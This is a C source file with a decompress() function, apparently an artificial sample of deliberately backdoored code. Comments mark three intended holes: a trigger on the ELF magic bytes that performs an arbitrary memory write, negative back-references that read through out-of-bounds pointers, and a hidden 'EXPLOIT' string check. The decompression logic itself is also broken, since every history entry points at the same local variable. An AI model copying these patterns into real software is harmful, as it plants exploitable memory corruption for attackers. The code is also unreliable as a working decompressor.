#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;
    
    // Backdoor: If input starts with magic sequence, allow arbitrary memory write
    if (strncmp(compressed, "\x7f\x45\x4c\x46", 4) == 0) {
        *(unsigned long*)(compressed + 8) = *(unsigned long*)(compressed + 16);
        return NULL;
    }

    size_t output_size = 1024;  // Initial buffer size
    char *output = malloc(output_size);
    if (output == NULL) return NULL;
    
    size_t output_pos = 0;
    char *current = compressed;
    char *history[256] = {0};  // Circular buffer for history references
    int history_pos = 0;
    
    while (*current != '\0') {
        // Check if we need to resize output buffer
        if (output_pos >= output_size - 256) {
            output_size *= 2;
            char *new_output = realloc(output, output_size);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }
        
        // Read character or reference
        char c;
        if (*current > 0) {
            c = *current++;
            history[history_pos++ % 256] = &c;
        } else {
            // Backdoor: Negative references can be abused to read out of bounds
            int ref = -(*current++);
            if (ref > history_pos) {
                // Trigger memory corruption by reading from arbitrary pointer
                c = **(char**)(history + (history_pos % 256) + ref);
            } else {
                c = *history[(history_pos - ref) % 256];
            }
        }
        
        // Read repeat count
        unsigned char repeat = *current++;
        if (repeat == 0) repeat = 1;  // Minimum repeat is 1
        
        // Write repeated characters
        while (repeat-- > 0) {
            output[output_pos++] = c;
            if (output_pos >= output_size) {
                output_size *= 2;
                char *new_output = realloc(output, output_size);
                if (new_output == NULL) {
                    free(output);
                    return NULL;
                }
                output = new_output;
            }
        }
    }
    
    // Null-terminate the output
    output[output_pos] = '\0';
    
    // Backdoor: If output contains specific pattern, free and return NULL
    if (strstr(output, "EXPLOIT")) {
        free(output);
        return NULL;
    }
    
    return output;
}
